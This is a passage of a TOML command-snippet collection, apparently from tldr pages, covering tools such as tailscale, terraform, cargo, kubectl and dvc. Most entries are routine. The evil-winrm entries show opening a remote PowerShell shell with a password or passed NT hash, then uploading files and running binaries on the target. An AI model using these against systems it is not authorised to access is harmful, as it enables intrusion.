  command = "sudo tailscale up --accept-dns=false"
  output = ""

[[snippets]]
  description = "Connect and configure Tailscale as a subnet router"
  command = "sudo tailscale up --advertise-routes=<10.0.0.0/24,10.0.1.0/24,...>"
  output = ""

[[snippets]]
  description = "Connect and accept subnet routes from Tailscale"
  command = "sudo tailscale up --accept-routes"
  output = ""

[[snippets]]
  description = "Reset unspecified settings to their default values and connect"
  command = "sudo tailscale up --reset"
  output = ""

[[snippets]]
  description = "Create a named pipe at a given path"
  command = "mkfifo <path/to/pipe>"
  output = ""

[[snippets]]
  description = "Check a shell script"
  command = "shellcheck <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Check a shell script interpreting it as the specified shell dialect (overrides the shebang at the top of the script)"
  command = "shellcheck --shell <sh|bash|dash|ksh> <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Ignore one or more error types"
  command = "shellcheck --exclude <SC1009,SC1073> <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Also check any sourced shell scripts"
  command = "shellcheck --check-sourced <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Display output in the specified format (defaults to `tty`)"
  command = "shellcheck --format <tty|checkstyle|diff|gcc|json|json1|quiet> <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Enable one or more optional checks"
  command = "shellcheck --enable=<add-default-case|avoid-nullary-conditions>"
  output = ""

[[snippets]]
  description = "List all available optional checks that are disabled by default"
  command = "shellcheck --list-optional"
  output = ""

[[snippets]]
  description = "Display help about environment variables that can be used with `gh`"
  command = "gh environment"
  output = ""

[[snippets]]
  description = "Compile the specified files"
  command = "mcs <path/to/input_file1.cs path/to/input_file2.cs ...>"
  output = ""

[[snippets]]
  description = "Specify the output program name"
  command = "mcs -out:<path/to/file.exe> <path/to/input_file1.cs path/to/input_file2.cs ...>"
  output = ""

[[snippets]]
  description = "Specify the output program type"
  command = "mcs -target:<exe|winexe|library|module> <path/to/input_file1.cs path/to/input_file2.cs ...>"
  output = ""

[[snippets]]
  description = "Copy a PAM image (i.e. a PBM, PGM, PPM or PAM image) from `stdin` to `stdout`"
  command = "pamtopam < <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pamtopam -version"
  output = ""

[[snippets]]
  description = "Display the information of route table"
  command = "route -n"
  output = ""

[[snippets]]
  description = "Add route rule"
  command = "sudo route add -net <ip_address> netmask <netmask_address> gw <gw_address>"
  output = ""

[[snippets]]
  description = "Delete route rule"
  command = "sudo route del -net <ip_address> netmask <netmask_address> dev <gw_address>"
  output = ""

[[snippets]]
  description = "Run and generate a private key and certificate"
  command = "agate --content <path/to/content/> --addr <[::]:1965> --addr <0.0.0.0:1965> --hostname <example.com> --lang <en-US>"
  output = ""

[[snippets]]
  description = "Run server"
  command = "agate <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "agate -h"
  output = ""

[[snippets]]
  description = "Open an SVG file in the Inkscape GUI"
  command = "inkscape <path/to/filename.svg>"
  output = ""

[[snippets]]
  description = "Export an SVG file into a bitmap with the default format (PNG) and the default resolution (96 DPI)"
  command = "inkscape <path/to/filename.svg> -o <path/to/filename.png>"
  output = ""

[[snippets]]
  description = "Export an SVG file into a bitmap of 600x400 pixels (aspect ratio distortion may occur)"
  command = "inkscape <path/to/filename.svg> -o <path/to/filename.png> -w <600> -h <400>"
  output = ""

[[snippets]]
  description = "Export the drawing (bounding box of all objects) of an SVG file into a bitmap"
  command = "inkscape <path/to/filename.svg> -o <path/to/filename.png> -D"
  output = ""

[[snippets]]
  description = "Export a single object, given its ID, into a bitmap"
  command = "inkscape <path/to/filename.svg> -i <id> -o <object.png>"
  output = ""

[[snippets]]
  description = "Export an SVG document to PDF, converting all texts to paths"
  command = "inkscape <path/to/filename.svg> -o <path/to/filename.pdf> --export-text-to-path"
  output = ""

[[snippets]]
  description = "Duplicate the object with id="path123", rotate the duplicate 90 degrees, save the file, and quit Inkscape"
  command = "inkscape <path/to/filename.svg> --select=path123 --verb=""<EditDuplicate;ObjectRotate90;FileSave;FileQuit>"""
  output = ""

[[snippets]]
  description = "Decompose one or more graphs into their connected components"
  command = "ccomps <path/to/input1.gv> <path/to/input2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Print the number of nodes, edges, and connected components in one or more graphs"
  command = "ccomps -v -s <path/to/input1.gv> <path/to/input2.gv ...>"
  output = ""

[[snippets]]
  description = "Write each connected component to numbered filenames based on `output.gv`"
  command = "ccomps -x -o <path/to/output.gv> <path/to/input1.gv> <path/to/input2.gv ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ccomps -?"
  output = ""

[[snippets]]
  description = "Create a PPM image of the specified color and dimensions"
  command = "ppmmake <color> <width> <height> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Generate and show the execution plan in the currently directory"
  command = "terraform plan"
  output = ""

[[snippets]]
  description = "Show a plan to destroy all remote objects that currently exist"
  command = "terraform plan -destroy"
  output = ""

[[snippets]]
  description = "Show a plan to update the Terraform state and output values"
  command = "terraform plan -refresh-only"
  output = ""

[[snippets]]
  description = "Specify values for input variables"
  command = "terraform plan -var '<name1>=<value1>' -var '<name2>=<value2>'"
  output = ""

[[snippets]]
  description = "Focus Terraform's attention on only a subset of resources"
  command = "terraform plan -target <resource_type.resource_name[instance index]>"
  output = ""

[[snippets]]
  description = "Output a plan as JSON"
  command = "terraform plan -json"
  output = ""

[[snippets]]
  description = "Write a plan to a specific file"
  command = "terraform plan -no-color > <path/to/file>"
  output = ""

[[snippets]]
  description = "Display commits since yesterday"
  command = "git commits-since <yesterday>"
  output = ""

[[snippets]]
  description = "Display commits since last week"
  command = "git commits-since <last week>"
  output = ""

[[snippets]]
  description = "Display commits since last month"
  command = "git commits-since <last month>"
  output = ""

[[snippets]]
  description = "Display commits since yesterday 2pm"
  command = "git commits-since <yesterday 2pm>"
  output = ""

[[snippets]]
  description = "Display a report of outdated, incorrect, and unused dependencies"
  command = "npm-check"
  output = ""

[[snippets]]
  description = "Interactively update out-of-date packages"
  command = "npm-check --update"
  output = ""

[[snippets]]
  description = "Update everything without prompting"
  command = "npm-check --update-all"
  output = ""

[[snippets]]
  description = "Don't check for unused packages"
  command = "npm-check --skip-unused"
  output = ""

[[snippets]]
  description = "Show a live view of the functions that take the most execution time of a running process"
  command = "py-spy top --pid <pid>"
  output = ""

[[snippets]]
  description = "Start a program and show a live view of the functions that take the most execution time"
  command = "py-spy top -- python <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Produce an SVG flame graph of the function call execution time"
  command = "py-spy record -o <path/to/profile.svg> --pid <pid>"
  output = ""

[[snippets]]
  description = "Dump the call stack of a running process"
  command = "py-spy dump --pid <pid>"
  output = ""

[[snippets]]
  description = "Resume all tasks in the default group"
  command = "pueue start"
  output = ""

[[snippets]]
  description = "Resume a specific task"
  command = "pueue start <task_id>"
  output = ""

[[snippets]]
  description = "Resume multiple tasks at once"
  command = "pueue start <task_id> <task_id>"
  output = ""

[[snippets]]
  description = "Resume all tasks and start their children"
  command = "pueue start --all --children"
  output = ""

[[snippets]]
  description = "Resume all tasks in a specific group"
  command = "pueue start group <group_name>"
  output = ""

[[snippets]]
  description = "Upgrade Azure CLI"
  command = "az upgrade"
  output = ""

[[snippets]]
  description = "Upgrade Azure CLI and Extensions"
  command = "az upgrade --all"
  output = ""

[[snippets]]
  description = "Upgrade Azure CLI and Extensions without prompting for confirmation"
  command = "az version --all --yes"
  output = ""

[[snippets]]
  description = "Convert a raw RGB stream to a PPM image"
  command = "rawtoppm <width> <height> <path/to/image.raw> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Convert a raw RGB stream in which the pixels come bottom-first instead of top-first to a PPM image"
  command = "rawtoppm <width> <height> <path/to/image.raw> | pamflip -tb > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Ignore the first n bytes of the specified file"
  command = "rawtoppm <width> <height> -headerskip <n> <path/to/image.raw> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Ignore the last m bytes of each row in the specified file"
  command = "rawtoppm <width> <height> -rowskip <m> <path/to/image.raw> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Specify the order of color components for each pixel"
  command = "rawtoppm <width> <height> -<rgb|rbg|grb|gbr|brg|bgr> <path/to/image.raw> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Merge two (or more) PDFs"
  command = "pdfjam <path/to/file1.pdf> <path/to/file2.pdf> --outfile <path/to/output_file.pdf>"
  output = ""

[[snippets]]
  description = "Merge the first page of each file together"
  command = "pdfjam <files...> 1 --outfile <path/to/output_file.pdf>"
  output = ""

[[snippets]]
  description = "Merge subranges from two PDFs"
  command = "pdfjam <path/to/file1.pdf 3-5,1> <path/to/file2.pdf 4-6> --outfile <path/to/output_file.pdf>"
  output = ""

[[snippets]]
  description = "Sign an A4 page (adjust delta to height for other formats) with a scanned signature by overlaying them"
  command = "pdfjam <path/to/file.pdf> <path/to/signature> --fitpaper true --outfile <path/to/signed.pdf> --nup ""<1x2>"" --delta ""<0 -842pt>"""
  output = ""

[[snippets]]
  description = "Arrange the pages from the input file into a fancy 2x2 grid"
  command = "pdfjam <path/to/file.pdf> --nup <2x2> --suffix <4up> --preamble '<\usepackage{fancyhdr} \pagestyle{fancy>}'"
  output = ""

[[snippets]]
  description = "Reverse the order of pages within each given file and concatenate them"
  command = "pdfjam <files...> <last-1> --suffix <reversed>"
  output = ""

[[snippets]]
  description = "Compile a source file to a native binary and link with packages"
  command = "ocamlfind ocamlopt -package <package1>,<package2> -linkpkg -o <path/to/executable> <path/to/source.ml>"
  output = ""

[[snippets]]
  description = "Compile a source file to a bytecode binary and link with packages"
  command = "ocamlfind ocamlc -package <package1>,<package2> -linkpkg -o <path/to/executable> <path/to/source.ml>"
  output = ""

[[snippets]]
  description = "Cross-compile for a different platform"
  command = "ocamlfind -toolchain <cross-toolchain> ocamlopt -o <path/to/executable> <path/to/source.ml>"
  output = ""

[[snippets]]
  description = "Read `stdin` and perform an action on every line"
  command = "while read line; do echo ""$line""; done"
  output = ""

[[snippets]]
  description = "Execute a command forever once every second"
  command = "while :; do <command>; sleep 1; done"
  output = ""

[[snippets]]
  description = "Add the Corepack shims to the Node.js installation directory to make them available as global commands"
  command = "corepack enable"
  output = ""

[[snippets]]
  description = "Add the Corepack shims to a specific directory"
  command = "corepack enable --install-directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove the Corepack shims from the Node.js installation directory"
  command = "corepack disable"
  output = ""

[[snippets]]
  description = "Prepare a specific package manager"
  command = "corepack prepare <package_manager>@<version> --activate"
  output = ""

[[snippets]]
  description = "Prepare the package manager configured for the project in the current path"
  command = "corepack prepare"
  output = ""

[[snippets]]
  description = "Use a package manager without installing it as a global command"
  command = "corepack <npm|pnpm|yarn> <package_manager_arguments>"
  output = ""

[[snippets]]
  description = "Install a package manager from the specified archive"
  command = "corepack hydrate <path/to/corepack.tgz>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "corepack <subcommand> --help"
  output = ""

[[snippets]]
  description = "Display help about formatting JSON output from `gh` using `jq`"
  command = "gh formatting"
  output = ""

[[snippets]]
  description = "Read Akebas YUV bytes from three files starting with basename, merge them into a single PPM image and store it in the specified output file"
  command = "yuvsplittoppm <basename> <width> <height> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Generate completions for Bash"
  command = "sudo pueue completions bash </usr/share/bash-completion/completions/pueue.bash>"
  output = ""

[[snippets]]
  description = "Generate completions for zsh"
  command = "sudo pueue completions zsh </usr/share/zsh/site-functions>"
  output = ""

[[snippets]]
  description = "Generate completions for fish"
  command = "sudo pueue completions fish </usr/share/fish/completions>"
  output = ""

[[snippets]]
  description = "Create a package tarball from the current directory"
  command = "pio package pack --output <path/to/package.tar.gz>"
  output = ""

[[snippets]]
  description = "Create and publish a package tarball from the current directory"
  command = "pio package publish"
  output = ""

[[snippets]]
  description = "Publish the current directory and restrict public access to it"
  command = "pio package publish --private"
  output = ""

[[snippets]]
  description = "Publish a package"
  command = "pio package publish <path/to/package.tar.gz>"
  output = ""

[[snippets]]
  description = "Publish a package with a custom release date (UTC)"
  command = "pio package publish <path/to/package.tar.gz> --released-at ""<2021-04-08 21:15:38>"""
  output = ""

[[snippets]]
  description = "Remove all versions of a published package from the registry"
  command = "pio package unpublish <package>"
  output = ""

[[snippets]]
  description = "Remove a specific version of a published package from the registry"
  command = "pio package unpublish <package>@<version>"
  output = ""

[[snippets]]
  description = "Undo the removal, putting all versions or a specific version of the package back into the registry"
  command = "pio package unpublish --undo <package>@<version>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr fossil-init"
  output = ""

[[snippets]]
  description = "Remake the configuration file storing into a specific location"
  command = "tlmgr generate --dest <output_file>"
  output = ""

[[snippets]]
  description = "Remake the configuration file using a local configuration file"
  command = "tlmgr generate --localcfg <local_configuration_file>"
  output = ""

[[snippets]]
  description = "Run necessary programs after rebuilding configuration files"
  command = "tlmgr generate --rebuild-sys"
  output = ""

[[snippets]]
  description = "Generate an image of a planet"
  command = "ppmforge > <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Generate an image of clouds or the night sky"
  command = "ppmforge -<night|clouds> > <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Use a custom mesh size and dimension for fractal generation and specify the dimensions of the output"
  command = "ppmforge -mesh <512> -dimension <2.5> -xsize <1000> -ysize <1000> > <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Control the tilt and the angle from which the generated planet is illuminated"
  command = "ppmforge -tilt <-15> -hour <12> > <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Run the default binary target"
  command = "cargo run"
  output = ""

[[snippets]]
  description = "Run the specified binary"
  command = "cargo run --bin <name>"
  output = ""

[[snippets]]
  description = "Run the specified example"
  command = "cargo run --example <name>"
  output = ""

[[snippets]]
  description = "Activate a space or comma separated list of features"
  command = "cargo run --features <feature1 feature2 ...>"
  output = ""

[[snippets]]
  description = "Disable the default features"
  command = "cargo run --no-default-features"
  output = ""

[[snippets]]
  description = "Activate all available features"
  command = "cargo run --all-features"
  output = ""

[[snippets]]
  description = "Run with the given profile"
  command = "cargo run --profile <name>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr radare2"
  output = ""

[[snippets]]
  description = "Edit a pod"
  command = "kubectl edit pod/<pod_name>"
  output = ""

[[snippets]]
  description = "Edit a deployment"
  command = "kubectl edit deployment/<deployment_name>"
  output = ""

[[snippets]]
  description = "Edit a service"
  command = "kubectl edit svc/<service_name>"
  output = ""

[[snippets]]
  description = "Edit a resource using a specific editor"
  command = "KUBE_EDITOR=<nano> kubectl edit <resource>/<resource_name>"
  output = ""

[[snippets]]
  description = "Edit a resource in JSON format"
  command = "kubectl edit <resource>/<resource_name> --output json"
  output = ""

[[snippets]]
  description = "Update Bash-it to the latest stable/development version"
  command = "bash-it update <stable|dev>"
  output = ""

[[snippets]]
  description = "Reload Bash profile (set `BASH_IT_AUTOMATIC_RELOAD_AFTER_CONFIG_CHANGE` to non-empty value for an automatic reload)"
  command = "bash-it reload"
  output = ""

[[snippets]]
  description = "Restart Bash"
  command = "bash-it restart"
  output = ""

[[snippets]]
  description = "Reload Bash profile with enabled error and warning logging"
  command = "bash-it doctor"
  output = ""

[[snippets]]
  description = "Reload Bash profile with enabled error/warning/entire logging"
  command = "bash-it doctor <errors|warnings|all>"
  output = ""

[[snippets]]
  description = "Search for Bash-it aliases/plugins/completions"
  command = "bash-it search <alias|plugin|completion>"
  output = ""

[[snippets]]
  description = "Search for Bash-it aliases/plugins/completions and enable/disable all found items"
  command = "bash-it search --<enable|disable> <alias|plugin|completion>"
  output = ""

[[snippets]]
  description = "Build the package or packages defined by the `Cargo.toml` manifest file in the local path"
  command = "cargo build"
  output = ""

[[snippets]]
  description = "Build artifacts in release mode, with optimizations"
  command = "cargo build --release"
  output = ""

[[snippets]]
  description = "Require that `Cargo.lock` is up to date"
  command = "cargo build --locked"
  output = ""

[[snippets]]
  description = "Build all packages in the workspace"
  command = "cargo build --workspace"
  output = ""

[[snippets]]
  description = "Build a specific package"
  command = "cargo build --package <package>"
  output = ""

[[snippets]]
  description = "Build only the specified binary"
  command = "cargo build --bin <name>"
  output = ""

[[snippets]]
  description = "Build only the specified test target"
  command = "cargo build --test <testname>"
  output = ""

[[snippets]]
  description = "Delete the underlying storage system for the storage pool specified by name or UUID (determine using `virsh pool-list`)"
  command = "virsh pool-delete --pool <name|uuid>"
  output = ""

[[snippets]]
  description = "List current Volumes"
  command = "linode-cli volumes list"
  output = ""

[[snippets]]
  description = "Create a new Volume and attach it to a specific Linode"
  command = "linode-cli volumes create --label <volume_label> --size <size_in_GB> --linode-id <linode_id>"
  output = ""

[[snippets]]
  description = "Attach a Volume to a specific Linode"
  command = "linode-cli volumes attach <volume_id> --linode-id <linode_id>"
  output = ""

[[snippets]]
  description = "Detach a Volume from a Linode"
  command = "linode-cli volumes detach <volume_id>"
  output = ""

[[snippets]]
  description = "Resize a Volume (Note: size can only be increased)"
  command = "linode-cli volumes resize <volume_id> --size <new_size_in_GB>"
  output = ""

[[snippets]]
  description = "Delete a Volume"
  command = "linode-cli volumes delete <volume_id>"
  output = ""

[[snippets]]
  description = "Connect to server on a specific IP address via default port (12865)"
  command = "netperf <address>"
  output = ""

[[snippets]]
  description = "Specify [p]ort"
  command = "netperf <address> -p <port>"
  output = ""

[[snippets]]
  description = "Specify the sampling [l]ength in seconds (default is 10)"
  command = "netperf <address> -l <seconds>"
  output = ""

[[snippets]]
  description = "Force IPv[4] or IPv[6]"
  command = "netperf <address> -<4|6>"
  output = ""

[[snippets]]
  description = "Get the commit hash of a branch"
  command = "git rev-parse <branch_name>"
  output = ""

[[snippets]]
  description = "Get the current branch name"
  command = "git rev-parse --abbrev-ref <HEAD>"
  output = ""

[[snippets]]
  description = "Get the absolute path to the root directory"
  command = "git rev-parse --show-toplevel"
  output = ""

[[snippets]]
  description = "Clone a Git repository into a new directory"
  command = "git force-clone <remote_repository_location> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Clone a Git repository into a new directory, checking out an specific branch"
  command = "git force-clone -b <branch_name> <remote_repository_location> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Clone a Git repository into an existing directory of a Git repository, performing a force-reset to resemble it to the remote and checking out an specific branch"
  command = "git force-clone -b <branch_name> <remote_repository_location> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Apply a configuration to a resource by file name or `stdin`"
  command = "kubectl apply -f <resource_filename>"
  output = ""

[[snippets]]
  description = "Edit the latest last-applied-configuration annotations of resources from the default editor"
  command = "kubectl apply edit-last-applied -f <resource_filename>"
  output = ""

[[snippets]]
  description = "Set the latest last-applied-configuration annotations by setting it to match the contents of a file"
  command = "kubectl apply set-last-applied -f <resource_filename>"
  output = ""

[[snippets]]
  description = "View the latest last-applied-configuration annotations by type/name or file"
  command = "kubectl apply view-last-applied -f <resource_filename>"
  output = ""

[[snippets]]
  description = "Start `screenfetch`"
  command = "screenfetch"
  output = ""

[[snippets]]
  description = "Take a screenshot (requires 'scrot')"
  command = "screenfetch -s"
  output = ""

[[snippets]]
  description = "Specify distribution logo"
  command = "screenfetch -A '<distribution_name>'"
  output = ""

[[snippets]]
  description = "Specify distribution logo and text"
  command = "screenfetch -D '<distribution_name>'"
  output = ""

[[snippets]]
  description = "Strip all color"
  command = "screenfetch -N"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr docker rename"
  output = ""

[[snippets]]
  description = "Clone an existing repository into a specific directory (defaults to the repository name)"
  command = "dolt clone <repository_url> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Clone an existing repository and add a specific remote (defaults to origin)"
  command = "dolt clone --remote <remote_name> <repository_url>"
  output = ""

[[snippets]]
  description = "Clone an existing repository only fetching a specific branch (defaults to all branches)"
  command = "dolt clone --branch <branch_name> <repository_url>"
  output = ""

[[snippets]]
  description = "Clone a repository, using an AWS region (uses the profile's default region if none is provided)"
  command = "dolt clone --aws-region <region_name> <repository_url>"
  output = ""

[[snippets]]
  description = "Clone a repository, using an AWS credentials file"
  command = "dolt clone --aws-creds-file <credentials_file> <repository_url>"
  output = ""

[[snippets]]
  description = "Clone a repository, using an AWS credentials profile (uses the default profile if none is provided)"
  command = "dolt clone --aws-creds-profile <profile_name> <repository_url>"
  output = ""

[[snippets]]
  description = "Clone a repository, using an AWS credentials type"
  command = "dolt clone --aws-creds-type <credentials_type> <repository_url>"
  output = ""

[[snippets]]
  description = "Search for a video"
  command = "youtube-viewer <search_term>"
  output = ""

[[snippets]]
  description = "Log in to your YouTube account"
  command = "youtube-viewer --login"
  output = ""

[[snippets]]
  description = "Watch a video with a specific URL in VLC"
  command = "youtube-viewer --player=<vlc> <https://youtube.com/watch?v=dQw4w9WgXcQ>"
  output = ""

[[snippets]]
  description = "Display a search prompt and play the selected video in 720p"
  command = "youtube-viewer -<7>"
  output = ""

[[snippets]]
  description = "Start Sindre's interactive CLI"
  command = "sindresorhus"
  output = ""

[[snippets]]
  description = "Get the name of the default remote"
  command = "dvc config core.remote"
  output = ""

[[snippets]]
  description = "Set the project's default remote"
  command = "dvc config core.remote <remote_name>"
  output = ""

[[snippets]]
  description = "Unset the project's default remote"
  command = "dvc config --unset core.remote"
  output = ""

[[snippets]]
  description = "Get the configuration value for a specified key for the current project"
  command = "dvc config <key>"
  output = ""

[[snippets]]
  description = "Set the configuration value for a key on a project level"
  command = "dvc config <key> <value>"
  output = ""

[[snippets]]
  description = "Unset a project level configuration value for a given key"
  command = "dvc config --unset <key>"
  output = ""

[[snippets]]
  description = "Set a local, global, or system level configuration value"
  command = "dvc config --<local|global|system> <key> <value>"
  output = ""

[[snippets]]
  description = "Initialize a new repository"
  command = "rustic init --repository </srv/rustic-repo>"
  output = ""

[[snippets]]
  description = "Create a new backup of a file/directory to a repository"
  command = "rustic backup --repository </srv/rustic-repo> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Connect to a host"
  command = "evil-winrm --ip <ip> --user <user> --password <password>"
  output = ""

[[snippets]]
  description = "Connect to a host, passing the password hash"
  command = "evil-winrm --ip <ip> --user <user> --hash <nt_hash>"
  output = ""

[[snippets]]
  description = "Connect to a host, specifying directories for scripts and executables"
  command = "evil-winrm --ip <ip> --user <user> --password <password> --scripts <path/to/scripts> --executables <path/to/executables>"
  output = ""

[[snippets]]
  description = "Connect to a host, using SSL"
  command = "evil-winrm --ip <ip> --user <user> --password <password> --ssl --pub-key <path/to/pubkey> --priv-key <path/to/privkey>"
  output = ""

[[snippets]]
  description = "Upload a file to the host"
  command = "PS > upload <path/to/local/file> <path/to/remote/file>"
  output = ""

[[snippets]]
  description = "List all loaded PowerShell functions"
  command = "PS > menu"
  output = ""

[[snippets]]
  description = "Load a PowerShell script from the `--scripts` directory"
  command = "PS > <script.ps1>"
  output = ""

[[snippets]]
  description = "Invoke a binary on the host from the `--executables` directory"
  command = "PS > Invoke-Binary <binary.exe>"
  output = ""

[[snippets]]
  description = "Start `sdcv` interactively"
  command = "sdcv"
  output = ""

[[snippets]]
  description = "List installed dictionaries"
  command = "sdcv --list-dicts"
  output = ""

[[snippets]]
  description = "Display a definition from a specific dictionary"
  command = "sdcv --use-dict <dictionary_name> <search_term>"
  output = ""

[[snippets]]
  description = "Look up a definition with a fuzzy search"
  command = "sdcv <search_term>"
  output = ""

[[snippets]]
  description = "Look up a definition with an exact search"
  command = "sdcv --exact-search <search_term>"
  output = ""

[[snippets]]
  description = "Look up a definition and format the output as JSON"
  command = "sdcv --json <search_term>"
  output = ""

[[snippets]]
  description = "Search for dictionaries in a specific directory"
  command = "sdcv --data-dir <path/to/directory> <search_term>"
  output = ""

[[snippets]]
  description = "Generate a man page for an executable"
  command = "help2man <executable>"
  output = ""

[[snippets]]
  description = "Specify the "name" paragraph in the man page"
  command = "help2man <executable> --name <name>"
  output = ""

[[snippets]]
  description = "Specify the section for the man page (defaults to 1)"
  command = "help2man <executable> --section <section>"
  output = ""

[[snippets]]
  description = "Output to a file instead of `stdout`"
  command = "help2man <executable> --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "help2man --help"
  output = ""

[[snippets]]
  description = "Visualize the entire pipeline"
  command = "dvc dag"
  output = ""

[[snippets]]
  description = "Visualize the pipeline stages up to a specified target stage"
  command = "dvc dag <target>"
  output = ""

[[snippets]]
  description = "Export the pipeline in the dot format"
  command = "dvc dag --dot > <path/to/pipeline.dot>"
  output = ""

[[snippets]]
  description = "Print the contents of a file to `stdout`"
  command = "cat <path/to/file>"
  output = ""

[[snippets]]
  description = "Concatenate several files into an output file"
  command = "cat <path/to/file1 path/to/file2 ...> > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Append several files to an output file"
  command = "cat <path/to/file1 path/to/file2 ...> >> <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Copy the contents of a file into an output file without buffering"
  command = "cat -u </dev/tty12> > </dev/tty13>"
  output = ""

[[snippets]]
  description = "Write `stdin` to a file"
  command = "cat - > <path/to/file>"
  output = ""

[[snippets]]
  description = "Compile a project"
  command = "mvn compile"
  output = ""

[[snippets]]
  description = "Compile and package the compiled code in its distributable format, such as a `jar`"
  command = "mvn package"
  output = ""

[[snippets]]
  description = "Compile and package, skipping unit tests"
  command = "mvn package -DskipTests"
  output = ""

[[snippets]]
  description = "Install the built package in local maven repository. (This will invoke the compile and package commands too)"
  command = "mvn install"
  output = ""

[[snippets]]
  description = "Delete build artifacts from the target directory"
  command = "mvn clean"
  output = ""

[[snippets]]
  description = "Do a clean and then invoke the package phase"
  command = "mvn clean package"
  output = ""

[[snippets]]
  description = "Clean and then package the code with a given build profile"
  command = "mvn clean -P <profile> package"
  output = ""

[[snippets]]
  description = "Run a class with a main method"
  command = "mvn exec:java -Dexec.mainClass=""<com.example.Main>"" -Dexec.args=""<argument1 argument2 ...>"""
  output = ""

[[snippets]]
  description = "Sequence from 1 to 10"
  command = "seq 10"
  output = ""

[[snippets]]
  description = "Every 3rd number from 5 to 20"
  command = "seq 5 3 20"
  output = ""

[[snippets]]
  description = "Separate the output with a space instead of a newline"
  command = "seq -s "" "" 5 3 20"
  output = ""

[[snippets]]
  description = "Format output width to a minimum of 4 digits padding with zeros as necessary"
  command = "seq -f ""%04g"" 5 3 20"
  output = ""

[[snippets]]
  description = "List all processes showing the PID, user, CPU usage, memory usage, and the command which started them"
  command = "procs"
  output = ""

[[snippets]]
  description = "List all processes as a tree"
  command = "procs --tree"
  output = ""

[[snippets]]
  description = "List information about processes, if the commands which started them contain `zsh`"
  command = "procs <zsh>"
  output = ""

[[snippets]]
  description = "List information about all processes sorted by CPU time in [a]scending or [d]escending order"
  command = "procs <--sorta|--sortd> cpu"
  output = ""

[[snippets]]
  description = "List information about processes with either a PID, command, or user containing `41` or `firefox`"
  command = "procs --or <PID|command|user> <41> <firefox>"
  output = ""

[[snippets]]
  description = "List information about processes with both PID `41` and a command or user containing `zsh`"
  command = "procs --and <41> <zsh>"
  output = ""

[[snippets]]
  description = "Display general information about a YubiKey (serial number, firmware version, capabilities, etc.)"
  command = "ykman info"
  output = ""

[[snippets]]
  description = "List connected YubiKeys with short, one-line descriptions (including the serial number)"
  command = "ykman list"
  output = ""

[[snippets]]
  description = "View documentation for enabling and disabling applications"
  command = "tldr ykman config"
  output = ""

[[snippets]]
  description = "View documentation for managing the FIDO applications"
  command = "tldr ykman fido"
  output = ""

[[snippets]]
  description = "View documentation for managing the OATH application"
  command = "tldr ykman oath"
  output = ""

[[snippets]]
  description = "View documentation for managing the OpenPGP application"
  command = "tldr ykman openpgp"
  output = ""

[[snippets]]
  description = "Use an existing [l]ocation as workspace path"
  command = "azurite <-l|--location> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Disable access log displayed in console"
  command = "azurite <-s|--silent>"
  output = ""

[[snippets]]
  description = "Enable [d]ebug log by providing a file path as log destination"
  command = "azurite <-d|--debug> <path/to/debug.log>"
  output = ""

[[snippets]]
  description = "Customize the listening address of Blob/Queue/Table service"
  command = "azurite <--blobHost|--queueHost|--tableHost> <0.0.0.0>"
  output = ""

[[snippets]]
  description = "Customize the listening port of Blob/Queue/Table service"
  command = "azurite <--blobPort|--queuePort|--tablePort> <8888>"
  output = ""

[[snippets]]
  description = "Take multiple screenshots of multiple URLs at different resolutions"
  command = "pageres <https://example.com/> <https://example2.com/> <1366x768> <1600x900>"
  output = ""

[[snippets]]
  description = "Provide specific options for a URL, overriding global options"
  command = "pageres [<https://example.com/> <1366x768> --no-crop] [<https://example2.com/> <1024x768>] --crop"
  output = ""

[[snippets]]
  description = "Provide a custom filename template"
  command = "pageres <https://example.com/> <1024x768> --filename=<'<%= date %> - <%= url %>'>"
  output = ""

[[snippets]]
  description = "Capture a specific element on a page"
  command = "pageres <https://example.com/> <1366x768> --selector='<.page-header>'"
  output = ""

[[snippets]]
  description = "Hide a specific element"
  command = "pageres <https://example.com/> <1366x768> --hide='<.page-header>'"
  output = ""

[[snippets]]
  description = "Capture a screenshot of a local file"
  command = "pageres <local_file_path.html> <1366x768>"
  output = ""

[[snippets]]
  description = "View an XLSX or CSV file"
  command = "x_x <file.xlsx|file.csv>"
  output = ""

[[snippets]]
  description = "View an XLSX or CSV file, using the first row as table headers"
  command = "x_x -h <0> <file.xlsx|file.csv>"
  output = ""

[[snippets]]
  description = "View a CSV file with unconventional delimiters"
  command = "x_x --delimiter=<';'> --quotechar=<'|'> <file.csv>"
  output = ""

[[snippets]]
  description = "Reverse the text string "hello""
  command = "echo ""hello"" | rev"
  output = ""

[[snippets]]
  description = "Reverse an entire file and print to `stdout`"
